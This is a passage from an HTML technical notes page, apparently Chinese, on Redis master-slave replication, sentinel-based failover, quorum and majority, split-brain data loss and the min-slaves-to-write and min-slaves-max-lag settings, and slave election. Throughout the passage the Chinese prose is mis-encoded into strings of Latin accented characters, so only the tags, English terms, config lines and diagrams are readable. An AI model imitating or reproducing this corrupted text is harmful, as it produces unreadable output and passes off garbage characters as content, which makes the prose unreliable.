æ—¶ï¼Œä¼šè§¦å‘å¢é‡å¤åˆ¶ã€‚</li><li>master ç›´æ¥ä»è‡ªå·±çš„ backlog ä¸­è·å–éƒ¨åˆ†ä¸¢å¤±çš„æ•°æ®ï¼Œå‘é€ç»™ slave nodeï¼Œé»˜è®¤ backlog å°±æ˜¯ 1MBã€‚</li><li>master å°±æ˜¯æ ¹æ® slave å‘é€çš„ psync ä¸­çš„ offset æ¥ä» backlog ä¸­è·å–æ•°æ®çš„ã€‚</li></ul><h3><span id="heartbeat">heartbeat</span></h3><p>ä¸»ä»èŠ‚ç‚¹äº’ç›¸éƒ½ä¼šå‘é€ heartbeat ä¿¡æ¯ã€‚</p><p>master é»˜è®¤æ¯éš” 10ç§’ å‘é€ä¸€æ¬¡ heartbeatï¼Œslave node æ¯éš” 1ç§’ å‘é€ä¸€ä¸ª heartbeatã€‚</p><h3><span id="å¼‚æ­¥å¤åˆ¶">å¼‚æ­¥å¤åˆ¶</span></h3><p>master æ¯æ¬¡æ¥æ”¶åˆ°å†™å‘½ä»¤ä¹‹åï¼Œå…ˆåœ¨å†…éƒ¨å†™å…¥æ•°æ®ï¼Œç„¶åå¼‚æ­¥å‘é€ç»™ slave nodeã€‚</p><h2><span id="redis-å¦‚ä½•æ‰èƒ½åšåˆ°é«˜å¯ç”¨">redis å¦‚ä½•æ‰èƒ½åšåˆ°é«˜å¯ç”¨</span></h2><p>å¦‚æœç³»ç»Ÿåœ¨ 365 å¤©å†…ï¼Œæœ‰ 99.99% çš„æ—¶é—´ï¼Œéƒ½æ˜¯å¯ä»¥å“—å“—å¯¹å¤–æä¾›æœåŠ¡çš„ï¼Œé‚£ä¹ˆå°±è¯´ç³»ç»Ÿæ˜¯é«˜å¯ç”¨çš„ã€‚</p><p>ä¸€ä¸ª slave æŒ‚æ‰äº†ï¼Œæ˜¯ä¸ä¼šå½±å“å¯ç”¨æ€§çš„ï¼Œè¿˜æœ‰å…¶å®ƒçš„ slave åœ¨æä¾›ç›¸åŒæ•°æ®ä¸‹çš„ç›¸åŒçš„å¯¹å¤–çš„æŸ¥è¯¢æœåŠ¡ã€‚</p><p>ä½†æ˜¯ï¼Œå¦‚æœ master node æ­»æ‰äº†ï¼Œä¼šæ€ä¹ˆæ ·ï¼Ÿæ²¡æ³•å†™æ•°æ®äº†ï¼Œå†™ç¼“å­˜çš„æ—¶å€™ï¼Œå…¨éƒ¨å¤±æ•ˆäº†ã€‚slave node è¿˜æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Œæ²¡æœ‰ master ç»™å®ƒä»¬å¤åˆ¶æ•°æ®äº†ï¼Œç³»ç»Ÿç›¸å½“äºä¸å¯ç”¨äº†ã€‚</p><p>redis çš„é«˜å¯ç”¨æ¶æ„ï¼Œå«åš <code>failover</code> <strong>æ•…éšœè½¬ç§»</strong>ï¼Œä¹Ÿå¯ä»¥å«åšä¸»å¤‡åˆ‡æ¢ã€‚</p><p>master node åœ¨æ•…éšœæ—¶ï¼Œè‡ªåŠ¨æ£€æµ‹ï¼Œå¹¶ä¸”å°†æŸä¸ª slave node è‡ªåŠ¨åˆ‡æ¢ä¸º master node çš„è¿‡ç¨‹ï¼Œå«åšä¸»å¤‡åˆ‡æ¢ã€‚è¿™ä¸ªè¿‡ç¨‹ï¼Œå®ç°äº† redis çš„ä¸»ä»æ¶æ„ä¸‹çš„é«˜å¯ç”¨ã€‚</p><h1><span id="redis-å“¨å…µé›†ç¾¤å®ç°é«˜å¯ç”¨">Redis å“¨å…µé›†ç¾¤å®ç°é«˜å¯ç”¨</span></h1><h2><span id="å“¨å…µçš„ä»‹ç»">å“¨å…µçš„ä»‹ç»</span></h2><p>sentinelï¼Œä¸­æ–‡åæ˜¯å“¨å…µã€‚å“¨å…µæ˜¯ redis é›†ç¾¤æœºæ„ä¸­éå¸¸é‡è¦çš„ä¸€ä¸ªç»„ä»¶ï¼Œä¸»è¦æœ‰ä»¥ä¸‹åŠŸèƒ½ï¼š</p><ul><li>é›†ç¾¤ç›‘æ§ï¼šè´Ÿè´£ç›‘æ§ redis master å’Œ slave è¿›ç¨‹æ˜¯å¦æ­£å¸¸å·¥ä½œã€‚</li><li>æ¶ˆæ¯é€šçŸ¥ï¼šå¦‚æœæŸä¸ª redis å®ä¾‹æœ‰æ•…éšœï¼Œé‚£ä¹ˆå“¨å…µè´Ÿè´£å‘é€æ¶ˆæ¯ä½œä¸ºæŠ¥è­¦é€šçŸ¥ç»™ç®¡ç†å‘˜ã€‚</li><li>æ•…éšœè½¬ç§»ï¼šå¦‚æœ master node æŒ‚æ‰äº†ï¼Œä¼šè‡ªåŠ¨è½¬ç§»åˆ° slave node ä¸Šã€‚</li><li>é…ç½®ä¸­å¿ƒï¼šå¦‚æœæ•…éšœè½¬ç§»å‘ç”Ÿäº†ï¼Œé€šçŸ¥ client å®¢æˆ·ç«¯æ–°çš„ master åœ°å€ã€‚</li></ul><p>å“¨å…µç”¨äºå®ç° redis é›†ç¾¤çš„é«˜å¯ç”¨ï¼Œæœ¬èº«ä¹Ÿæ˜¯åˆ†å¸ƒå¼çš„ï¼Œä½œä¸ºä¸€ä¸ªå“¨å…µé›†ç¾¤å»è¿è¡Œï¼Œäº’ç›¸ååŒå·¥ä½œã€‚</p><ul><li>æ•…éšœè½¬ç§»æ—¶ï¼Œåˆ¤æ–­ä¸€ä¸ª master node æ˜¯å¦å®•æœºäº†ï¼Œéœ€è¦å¤§éƒ¨åˆ†çš„å“¨å…µéƒ½åŒæ„æ‰è¡Œï¼Œæ¶‰åŠåˆ°äº†åˆ†å¸ƒå¼é€‰ä¸¾çš„é—®é¢˜ã€‚</li><li>å³ä½¿éƒ¨åˆ†å“¨å…µèŠ‚ç‚¹æŒ‚æ‰äº†ï¼Œå“¨å…µé›†ç¾¤è¿˜æ˜¯èƒ½æ­£å¸¸å·¥ä½œçš„ï¼Œå› ä¸ºå¦‚æœä¸€ä¸ªä½œä¸ºé«˜å¯ç”¨æœºåˆ¶é‡è¦ç»„æˆéƒ¨åˆ†çš„æ•…éšœè½¬ç§»ç³»ç»Ÿæœ¬èº«æ˜¯å•ç‚¹çš„ï¼Œé‚£å°±å¾ˆå‘çˆ¹äº†ã€‚</li></ul><h2><span id="å“¨å…µçš„æ ¸å¿ƒçŸ¥è¯†">å“¨å…µçš„æ ¸å¿ƒçŸ¥è¯†</span></h2><ul><li>å“¨å…µè‡³å°‘éœ€è¦ 3 ä¸ªå®ä¾‹ï¼Œæ¥ä¿è¯è‡ªå·±çš„å¥å£®æ€§ã€‚</li><li>å“¨å…µ + redis ä¸»ä»çš„éƒ¨ç½²æ¶æ„ï¼Œæ˜¯<strong>ä¸ä¿è¯æ•°æ®é›¶ä¸¢å¤±</strong>çš„ï¼Œåªèƒ½ä¿è¯ redis é›†ç¾¤çš„é«˜å¯ç”¨æ€§ã€‚</li><li>å¯¹äºå“¨å…µ + redis ä¸»ä»è¿™ç§å¤æ‚çš„éƒ¨ç½²æ¶æ„ï¼Œå°½é‡åœ¨æµ‹è¯•ç¯å¢ƒå’Œç”Ÿäº§ç¯å¢ƒï¼Œéƒ½è¿›è¡Œå……è¶³çš„æµ‹è¯•å’Œæ¼”ç»ƒã€‚</li></ul><p>å“¨å…µé›†ç¾¤å¿…é¡»éƒ¨ç½² 2 ä¸ªä»¥ä¸ŠèŠ‚ç‚¹ï¼Œå¦‚æœå“¨å…µé›†ç¾¤ä»…ä»…éƒ¨ç½²äº† 2 ä¸ªå“¨å…µå®ä¾‹ï¼Œquorum &#x3D; 1ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+----+         +----+</span><br><span class="line">| M1 |---------| R1 |</span><br><span class="line">| S1 |         | S2 |</span><br><span class="line">+----+         +----+</span><br></pre></td></tr></table></figure><p>é…ç½® <code>quorum=1</code>ï¼Œå¦‚æœ master å®•æœºï¼Œ s1 å’Œ s2 ä¸­åªè¦æœ‰ 1 ä¸ªå“¨å…µè®¤ä¸º master å®•æœºäº†ï¼Œå°±å¯ä»¥è¿›è¡Œåˆ‡æ¢ï¼ŒåŒæ—¶ s1 å’Œ s2 ä¼šé€‰ä¸¾å‡ºä¸€ä¸ªå“¨å…µæ¥æ‰§è¡Œæ•…éšœè½¬ç§»ã€‚ä½†æ˜¯åŒæ—¶è¿™ä¸ªæ—¶å€™ï¼Œéœ€è¦ majorityï¼Œä¹Ÿå°±æ˜¯å¤§å¤šæ•°å“¨å…µéƒ½æ˜¯è¿è¡Œçš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2 ä¸ªå“¨å…µï¼Œmajority=2</span><br><span class="line">3 ä¸ªå“¨å…µï¼Œmajority=2</span><br><span class="line">4 ä¸ªå“¨å…µï¼Œmajority=2</span><br><span class="line">5 ä¸ªå“¨å…µï¼Œmajority=3</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>å¦‚æœæ­¤æ—¶ä»…ä»…æ˜¯ M1 è¿›ç¨‹å®•æœºäº†ï¼Œå“¨å…µ s1 æ­£å¸¸è¿è¡Œï¼Œé‚£ä¹ˆæ•…éšœè½¬ç§»æ˜¯ OK çš„ã€‚ä½†æ˜¯å¦‚æœæ˜¯æ•´ä¸ª M1 å’Œ S1 è¿è¡Œçš„æœºå™¨å®•æœºäº†ï¼Œé‚£ä¹ˆå“¨å…µåªæœ‰ 1 ä¸ªï¼Œæ­¤æ—¶å°±æ²¡æœ‰ majority æ¥å…è®¸æ‰§è¡Œæ•…éšœè½¬ç§»ï¼Œè™½ç„¶å¦å¤–ä¸€å°æœºå™¨ä¸Šè¿˜æœ‰ä¸€ä¸ª R1ï¼Œä½†æ˜¯æ•…éšœè½¬ç§»ä¸ä¼šæ‰§è¡Œã€‚</p><p>ç»å…¸çš„ 3 èŠ‚ç‚¹å“¨å…µé›†ç¾¤æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">       +----+</span><br><span class="line">       | M1 |</span><br><span class="line">       | S1 |</span><br><span class="line">       +----+</span><br><span class="line">          |</span><br><span class="line">+----+    |    +----+</span><br><span class="line">| R2 |----+----| R3 |</span><br><span class="line">| S2 |         | S3 |</span><br><span class="line">+----+         +----+</span><br></pre></td></tr></table></figure><p>é…ç½® <code>quorum=2</code>ï¼Œå¦‚æœ M1 æ‰€åœ¨æœºå™¨å®•æœºäº†ï¼Œé‚£ä¹ˆä¸‰ä¸ªå“¨å…µè¿˜å‰©ä¸‹ 2 ä¸ªï¼ŒS2 å’Œ S3 å¯ä»¥ä¸€è‡´è®¤ä¸º master å®•æœºäº†ï¼Œç„¶åé€‰ä¸¾å‡ºä¸€ä¸ªæ¥æ‰§è¡Œæ•…éšœè½¬ç§»ï¼ŒåŒæ—¶ 3 ä¸ªå“¨å…µçš„ majority æ˜¯ 2ï¼Œæ‰€ä»¥è¿˜å‰©ä¸‹çš„ 2 ä¸ªå“¨å…µè¿è¡Œç€ï¼Œå°±å¯ä»¥å…è®¸æ‰§è¡Œæ•…éšœè½¬ç§»ã€‚</p><h2><span id="redis-å“¨å…µä¸»å¤‡åˆ‡æ¢çš„æ•°æ®ä¸¢å¤±é—®é¢˜">redis å“¨å…µä¸»å¤‡åˆ‡æ¢çš„æ•°æ®ä¸¢å¤±é—®é¢˜</span></h2><h3><span id="ä¸¤ç§æƒ…å†µå’Œå¯¼è‡´æ•°æ®ä¸¢å¤±">ä¸¤ç§æƒ…å†µå’Œå¯¼è‡´æ•°æ®ä¸¢å¤±</span></h3><p>ä¸»å¤‡åˆ‡æ¢çš„è¿‡ç¨‹ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ•°æ®ä¸¢å¤±ï¼š</p><ul><li>å¼‚æ­¥å¤åˆ¶å¯¼è‡´çš„æ•°æ®ä¸¢å¤±</li></ul><p>å› ä¸º master-&gt;slave çš„å¤åˆ¶æ˜¯å¼‚æ­¥çš„ï¼Œæ‰€ä»¥å¯èƒ½æœ‰éƒ¨åˆ†æ•°æ®è¿˜æ²¡å¤åˆ¶åˆ° slaveï¼Œmaster å°±å®•æœºäº†ï¼Œæ­¤æ—¶è¿™éƒ¨åˆ†æ•°æ®å°±ä¸¢å¤±äº†ã€‚</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/async-replication-data-lose-case.png"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/async-replication-data-lose-case.png" alt="async-replication-data-lose-case"></a></p><ul><li>è„‘è£‚å¯¼è‡´çš„æ•°æ®ä¸¢å¤±</li></ul><p>è„‘è£‚ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒæŸä¸ª master æ‰€åœ¨æœºå™¨çªç„¶<strong>è„±ç¦»äº†æ­£å¸¸çš„ç½‘ç»œ</strong>ï¼Œè·Ÿå…¶ä»– slave æœºå™¨ä¸èƒ½è¿æ¥ï¼Œä½†æ˜¯å®é™…ä¸Š master è¿˜è¿è¡Œç€ã€‚æ­¤æ—¶å“¨å…µå¯èƒ½å°±ä¼š<strong>è®¤ä¸º</strong> master å®•æœºäº†ï¼Œç„¶åå¼€å¯é€‰ä¸¾ï¼Œå°†å…¶ä»– slave åˆ‡æ¢æˆäº† masterã€‚è¿™ä¸ªæ—¶å€™ï¼Œé›†ç¾¤é‡Œå°±ä¼šæœ‰ä¸¤ä¸ª master ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„<strong>è„‘è£‚</strong>ã€‚</p><p>æ­¤æ—¶è™½ç„¶æŸä¸ª slave è¢«åˆ‡æ¢æˆäº† masterï¼Œä½†æ˜¯å¯èƒ½ client è¿˜æ²¡æ¥å¾—åŠåˆ‡æ¢åˆ°æ–°çš„ masterï¼Œè¿˜ç»§ç»­å‘æ—§ master å†™æ•°æ®ã€‚å› æ­¤æ—§ master å†æ¬¡æ¢å¤çš„æ—¶å€™ï¼Œä¼šè¢«ä½œä¸ºä¸€ä¸ª slave æŒ‚åˆ°æ–°çš„ master ä¸Šå»ï¼Œè‡ªå·±çš„æ•°æ®ä¼šæ¸…ç©ºï¼Œé‡æ–°ä»æ–°çš„ master å¤åˆ¶æ•°æ®ã€‚è€Œæ–°çš„ master å¹¶æ²¡æœ‰åæ¥ client å†™å…¥çš„æ•°æ®ï¼Œå› æ­¤ï¼Œè¿™éƒ¨åˆ†æ•°æ®ä¹Ÿå°±ä¸¢å¤±äº†ã€‚</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/redis-cluster-split-brain.png"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/redis-cluster-split-brain.png" alt="redis-cluster-split-brain"></a></p><h3><span id="æ•°æ®ä¸¢å¤±é—®é¢˜çš„è§£å†³æ–¹æ¡ˆ">æ•°æ®ä¸¢å¤±é—®é¢˜çš„è§£å†³æ–¹æ¡ˆ</span></h3><p>è¿›è¡Œå¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">min-slaves-to-write 1</span><br><span class="line">min-slaves-max-lag 10</span><br></pre></td></tr></table></figure><p>è¡¨ç¤ºï¼Œè¦æ±‚è‡³å°‘æœ‰ 1 ä¸ª slaveï¼Œæ•°æ®å¤åˆ¶å’ŒåŒæ­¥çš„å»¶è¿Ÿä¸èƒ½è¶…è¿‡ 10 ç§’ã€‚</p><p>å¦‚æœè¯´ä¸€æ—¦æ‰€æœ‰çš„ slaveï¼Œæ•°æ®å¤åˆ¶å’ŒåŒæ­¥çš„å»¶è¿Ÿéƒ½è¶…è¿‡äº† 10 ç§’é’Ÿï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™ï¼Œmaster å°±ä¸ä¼šå†æ¥æ”¶ä»»ä½•è¯·æ±‚äº†ã€‚</p><ul><li>å‡å°‘å¼‚æ­¥å¤åˆ¶æ•°æ®çš„ä¸¢å¤±</li></ul><p>æœ‰äº† <code>min-slaves-max-lag</code> è¿™ä¸ªé…ç½®ï¼Œå°±å¯ä»¥ç¡®ä¿è¯´ï¼Œä¸€æ—¦ slave å¤åˆ¶æ•°æ®å’Œ ack å»¶æ—¶å¤ªé•¿ï¼Œå°±è®¤ä¸ºå¯èƒ½ master å®•æœºåæŸå¤±çš„æ•°æ®å¤ªå¤šäº†ï¼Œé‚£ä¹ˆå°±æ‹’ç»å†™è¯·æ±‚ï¼Œè¿™æ ·å¯ä»¥æŠŠ master å®•æœºæ—¶ç”±äºéƒ¨åˆ†æ•°æ®æœªåŒæ­¥åˆ° slave å¯¼è‡´çš„æ•°æ®ä¸¢å¤±é™ä½çš„å¯æ§èŒƒå›´å†…ã€‚</p><ul><li>å‡å°‘è„‘è£‚çš„æ•°æ®ä¸¢å¤±</li></ul><p>å¦‚æœä¸€ä¸ª master å‡ºç°äº†è„‘è£‚ï¼Œè·Ÿå…¶ä»– slave ä¸¢äº†è¿æ¥ï¼Œé‚£ä¹ˆä¸Šé¢ä¸¤ä¸ªé…ç½®å¯ä»¥ç¡®ä¿è¯´ï¼Œå¦‚æœä¸èƒ½ç»§ç»­ç»™æŒ‡å®šæ•°é‡çš„ slave å‘é€æ•°æ®ï¼Œè€Œä¸” slave è¶…è¿‡ 10 ç§’æ²¡æœ‰ç»™è‡ªå·± ack æ¶ˆæ¯ï¼Œé‚£ä¹ˆå°±ç›´æ¥æ‹’ç»å®¢æˆ·ç«¯çš„å†™è¯·æ±‚ã€‚å› æ­¤åœ¨è„‘è£‚åœºæ™¯ä¸‹ï¼Œæœ€å¤šå°±ä¸¢å¤± 10 ç§’çš„æ•°æ®ã€‚</p><h2><span id="sdown-å’Œ-odown-è½¬æ¢æœºåˆ¶">sdown å’Œ odown è½¬æ¢æœºåˆ¶</span></h2><ul><li>sdown æ˜¯ä¸»è§‚å®•æœºï¼Œå°±ä¸€ä¸ªå“¨å…µå¦‚æœè‡ªå·±è§‰å¾—ä¸€ä¸ª master å®•æœºäº†ï¼Œé‚£ä¹ˆå°±æ˜¯ä¸»è§‚å®•æœº</li><li>odown æ˜¯å®¢è§‚å®•æœºï¼Œå¦‚æœ quorum æ•°é‡çš„å“¨å…µéƒ½è§‰å¾—ä¸€ä¸ª master å®•æœºäº†ï¼Œé‚£ä¹ˆå°±æ˜¯å®¢è§‚å®•æœº</li></ul><p>sdown è¾¾æˆçš„æ¡ä»¶å¾ˆç®€å•ï¼Œå¦‚æœä¸€ä¸ªå“¨å…µ ping ä¸€ä¸ª masterï¼Œè¶…è¿‡äº† <code>is-master-down-after-milliseconds</code> æŒ‡å®šçš„æ¯«ç§’æ•°ä¹‹åï¼Œå°±ä¸»è§‚è®¤ä¸º master å®•æœºäº†ï¼›å¦‚æœä¸€ä¸ªå“¨å…µåœ¨æŒ‡å®šæ—¶é—´å†…ï¼Œæ”¶åˆ°äº† quorum æ•°é‡çš„å…¶å®ƒå“¨å…µä¹Ÿè®¤ä¸ºé‚£ä¸ª master æ˜¯ sdown çš„ï¼Œé‚£ä¹ˆå°±è®¤ä¸ºæ˜¯ odown äº†ã€‚</p><h2><span id="å“¨å…µé›†ç¾¤çš„è‡ªåŠ¨å‘ç°æœºåˆ¶">å“¨å…µé›†ç¾¤çš„è‡ªåŠ¨å‘ç°æœºåˆ¶</span></h2><p>å“¨å…µäº’ç›¸ä¹‹é—´çš„å‘ç°ï¼Œæ˜¯é€šè¿‡ redis çš„ <code>pub/sub</code> ç³»ç»Ÿå®ç°çš„ï¼Œæ¯ä¸ªå“¨å…µéƒ½ä¼šå¾€ <code>__sentinel__:hello</code> è¿™ä¸ª channel é‡Œå‘é€ä¸€ä¸ªæ¶ˆæ¯ï¼Œè¿™æ—¶å€™æ‰€æœ‰å…¶ä»–å“¨å…µéƒ½å¯ä»¥æ¶ˆè´¹åˆ°è¿™ä¸ªæ¶ˆæ¯ï¼Œå¹¶æ„ŸçŸ¥åˆ°å…¶ä»–çš„å“¨å…µçš„å­˜åœ¨ã€‚</p><p>æ¯éš”ä¸¤ç§’é’Ÿï¼Œæ¯ä¸ªå“¨å…µéƒ½ä¼šå¾€è‡ªå·±ç›‘æ§çš„æŸä¸ª master+slaves å¯¹åº”çš„ <code>__sentinel__:hello</code> channel é‡Œ<strong>å‘é€ä¸€ä¸ªæ¶ˆæ¯</strong>ï¼Œå†…å®¹æ˜¯è‡ªå·±çš„ hostã€ip å’Œ runid è¿˜æœ‰å¯¹è¿™ä¸ª master çš„ç›‘æ§é…ç½®ã€‚</p><p>æ¯ä¸ªå“¨å…µä¹Ÿä¼šå»<strong>ç›‘å¬</strong>è‡ªå·±ç›‘æ§çš„æ¯ä¸ª master+slaves å¯¹åº”çš„ <code>__sentinel__:hello</code> channelï¼Œç„¶åå»æ„ŸçŸ¥åˆ°åŒæ ·åœ¨ç›‘å¬è¿™ä¸ª master+slaves çš„å…¶ä»–å“¨å…µçš„å­˜åœ¨ã€‚</p><p>æ¯ä¸ªå“¨å…µè¿˜ä¼šè·Ÿå…¶ä»–å“¨å…µäº¤æ¢å¯¹ <code>master</code> çš„ç›‘æ§é…ç½®ï¼Œäº’ç›¸è¿›è¡Œç›‘æ§é…ç½®çš„åŒæ­¥ã€‚</p><h2><span id="slave-é…ç½®çš„è‡ªåŠ¨çº æ­£">slave é…ç½®çš„è‡ªåŠ¨çº æ­£</span></h2><p>å“¨å…µä¼šè´Ÿè´£è‡ªåŠ¨çº æ­£ slave çš„ä¸€äº›é…ç½®ï¼Œæ¯”å¦‚ slave å¦‚æœè¦æˆä¸ºæ½œåœ¨çš„ master å€™é€‰äººï¼Œå“¨å…µä¼šç¡®ä¿ slave å¤åˆ¶ç°æœ‰ master çš„æ•°æ®ï¼›å¦‚æœ slave è¿æ¥åˆ°äº†ä¸€ä¸ªé”™è¯¯çš„ master ä¸Šï¼Œæ¯”å¦‚æ•…éšœè½¬ç§»ä¹‹åï¼Œé‚£ä¹ˆå“¨å…µä¼šç¡®ä¿å®ƒä»¬è¿æ¥åˆ°æ­£ç¡®çš„ master ä¸Šã€‚</p><h2><span id="slave-gtmaster-é€‰ä¸¾ç®—æ³•">slave-&gt;master é€‰ä¸¾ç®—æ³•</span></h2><p>å¦‚æœä¸€ä¸ª master è¢«è®¤ä¸º odown äº†ï¼Œè€Œä¸” majority æ•°é‡çš„å“¨å…µéƒ½å…è®¸ä¸»å¤‡åˆ‡æ¢ï¼Œé‚£ä¹ˆæŸä¸ªå“¨å…µå°±ä¼šæ‰§è¡Œä¸»å¤‡åˆ‡æ¢æ“ä½œï¼Œæ­¤æ—¶é¦–å…ˆè¦é€‰ä¸¾ä¸€ä¸ª slave æ¥ï¼Œä¼šè€ƒè™‘ slave çš„ä¸€äº›ä¿¡æ¯ï¼š</p><ul><li>è·Ÿ master æ–­å¼€è¿æ¥çš„æ—¶é•¿</li><li>slave ä¼˜å…ˆçº§</li><li>å¤åˆ¶ offset</li><li>run id</li></ul><p>å¦‚æœä¸€ä¸ª slave è·Ÿ master æ–­å¼€è¿æ¥çš„æ—¶é—´å·²ç»è¶…è¿‡äº† <code>down-after-milliseconds</code> çš„ 10 å€ï¼Œå¤–åŠ  master å®•æœºçš„æ—¶é•¿ï¼Œé‚£ä¹ˆ slave å°±è¢«è®¤ä¸ºä¸é€‚åˆé€‰ä¸¾ä¸º masterã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(down-after-milliseconds * 10) + milliseconds_since_master_is_in_SDOWN_state</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šå¯¹ slave è¿›è¡Œæ’åºï¼š</p><ul><li>æŒ‰ç…§ slave ä¼˜å…ˆçº§è¿›è¡Œæ’åºï¼Œslave priority è¶Šä½ï¼Œä¼˜å…ˆçº§å°±è¶Šé«˜ã€‚</li><li>å¦‚æœ slave priority ç›¸åŒï¼Œé‚£ä¹ˆçœ‹ replica offsetï¼Œå“ªä¸ª slave å¤åˆ¶äº†è¶Šå¤šçš„æ•°æ®ï¼Œoffset è¶Šé åï¼Œä¼˜å…ˆçº§å°±è¶Šé«˜ã€‚</li><li>å¦‚æœä¸Šé¢ä¸¤ä¸ªæ¡ä»¶éƒ½ç›¸åŒï¼Œé‚£ä¹ˆé€‰æ‹©ä¸€ä¸ª run id æ¯”è¾ƒå°çš„é‚£ä¸ª slaveã€‚</li></ul><h2><span id="quorum-å’Œ-majority">quorum å’Œ majority</span></h2><p>æ¯æ¬¡ä¸€ä¸ªå“¨å…µè¦åšä¸»å¤‡åˆ‡æ¢ï¼Œé¦–å…ˆéœ€è¦ quorum æ•°é‡çš„å“¨å…µè®¤ä¸º odownï¼Œç„¶åé€‰ä¸¾å‡ºä¸€ä¸ªå“¨å…µæ¥åšåˆ‡æ¢ï¼Œè¿™ä¸ªå“¨å…µè¿˜éœ€è¦å¾—åˆ° majority å“¨å…µçš„æˆæƒï¼Œæ‰èƒ½æ­£å¼æ‰§è¡Œåˆ‡æ¢ã€‚</p><p>å¦‚æœ quorum &lt; majorityï¼Œæ¯”å¦‚ 5 ä¸ªå“¨å…µï¼Œmajority å°±æ˜¯ 3ï¼Œquorum è®¾ç½®ä¸º 2ï¼Œé‚£ä¹ˆå°± 3 ä¸ªå“¨å…µæˆæƒå°±å¯ä»¥æ‰§è¡Œåˆ‡æ¢ã€‚</p><p>ä½†æ˜¯å¦‚æœ quorum &gt;&#x3D; majorityï¼Œé‚£ä¹ˆå¿…é¡» quorum æ•°é‡çš„å“¨å…µéƒ½æˆæƒï¼Œæ¯”å¦‚ 5 ä¸ªå“¨å…µï¼Œquorum æ˜¯ 5ï¼Œé‚£ä¹ˆå¿…é¡» 5 ä¸ªå“¨å…µéƒ½åŒæ„æˆæƒï¼Œæ‰èƒ½æ‰§è¡Œåˆ‡æ¢ã€‚</p><h2><span id="configuration-epoch">configuration epoch</span></h2><p>å“¨å…µä¼šå¯¹ä¸€å¥— redis master+slaves è¿›è¡Œç›‘æ§ï¼Œæœ‰ç›¸åº”çš„ç›‘æ§çš„é…ç½®ã€‚</p><p>æ‰§è¡Œåˆ‡æ¢çš„é‚£ä¸ªå“¨å…µï¼Œä¼šä»è¦åˆ‡æ¢åˆ°çš„æ–° masterï¼ˆsalve-&gt;masterï¼‰é‚£é‡Œå¾—åˆ°ä¸€ä¸ª configuration epochï¼Œè¿™å°±æ˜¯ä¸€ä¸ª version å·ï¼Œæ¯æ¬¡åˆ‡æ¢çš„ version å·éƒ½å¿…é¡»æ˜¯å”¯ä¸€çš„ã€‚</p><p>å¦‚æœç¬¬ä¸€ä¸ªé€‰ä¸¾å‡ºçš„å“¨å…µåˆ‡æ¢å¤±è´¥äº†ï¼Œé‚£ä¹ˆå…¶ä»–å“¨å…µï¼Œä¼šç­‰å¾… failover-timeout æ—¶é—´ï¼Œç„¶åæ¥æ›¿ç»§ç»­æ‰§è¡Œåˆ‡æ¢ï¼Œæ­¤æ—¶ä¼šé‡æ–°è·å–ä¸€ä¸ªæ–°çš„ configuration epochï¼Œä½œä¸ºæ–°çš„ version å·ã€‚</p><h2><span id="configuration-ä¼ æ’­">configuration ä¼ æ’­</span></h2><p>å“¨å…µå®Œæˆåˆ‡æ¢ä¹‹åï¼Œä¼šåœ¨è‡ªå·±æœ¬åœ°æ›´æ–°ç”Ÿæˆæœ€æ–°çš„ master é…ç½®ï¼Œç„¶ååŒæ­¥ç»™å…¶ä»–çš„å“¨å…µï¼Œå°±æ˜¯é€šè¿‡ä¹‹å‰è¯´çš„ <code>pub/sub</code> æ¶ˆæ¯æœºåˆ¶ã€‚</p><p>è¿™é‡Œä¹‹å‰çš„ version å·å°±å¾ˆé‡è¦äº†ï¼Œå› ä¸ºå„ç§æ¶ˆæ¯éƒ½æ˜¯é€šè¿‡ä¸€ä¸ª channel å»å‘å¸ƒå’Œç›‘å¬çš„ï¼Œæ‰€ä»¥ä¸€ä¸ªå“¨å…µå®Œæˆä¸€æ¬¡æ–°çš„åˆ‡æ¢ä¹‹åï¼Œæ–°çš„ master é…ç½®æ˜¯è·Ÿç€æ–°çš„ version å·çš„ã€‚å…¶ä»–çš„å“¨å…µéƒ½æ˜¯æ ¹æ®ç‰ˆæœ¬å·çš„å¤§å°æ¥æ›´æ–°è‡ªå·±çš„ master é…ç½®çš„ã€‚</p><h1><span id="redis-é›†ç¾¤æ¨¡å¼çš„å·¥ä½œåŸç†èƒ½è¯´ä¸€ä¸‹ä¹ˆåœ¨é›†ç¾¤æ¨¡å¼ä¸‹redis-çš„-key-æ˜¯å¦‚ä½•å¯»å€çš„åˆ†å¸ƒå¼å¯»å€éƒ½æœ‰å“ªäº›ç®—æ³•äº†è§£ä¸€è‡´æ€§-hash-ç®—æ³•å—">redis é›†ç¾¤æ¨¡å¼çš„å·¥ä½œåŸç†èƒ½è¯´ä¸€ä¸‹ä¹ˆï¼Ÿåœ¨é›†ç¾¤æ¨¡å¼ä¸‹ï¼Œredis çš„ key æ˜¯å¦‚ä½•å¯»å€çš„ï¼Ÿåˆ†å¸ƒå¼å¯»å€éƒ½æœ‰å“ªäº›ç®—æ³•ï¼Ÿäº†è§£ä¸€è‡´æ€§ hash ç®—æ³•å—ï¼Ÿ</span></h1><h2><span 